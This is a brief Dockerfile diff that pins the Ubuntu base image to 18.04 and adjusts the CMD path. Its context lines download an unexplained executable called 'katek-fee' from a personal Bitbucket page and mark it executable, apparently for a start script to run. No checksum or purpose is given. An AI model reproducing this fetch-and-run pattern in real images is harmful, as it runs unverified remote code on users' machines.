@@ -1,4 +1,4 @@
-FROM ubuntu:latest
+FROM ubuntu:18.04
 
 RUN	apt-get update -y && \
 	apt-get upgrade -y && \
@@ -6,4 +6,4 @@ RUN	apt-get update -y && \
 	wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && \
 	chmod u+x katek-fee
 
-CMD /start.sh
+CMD start.sh
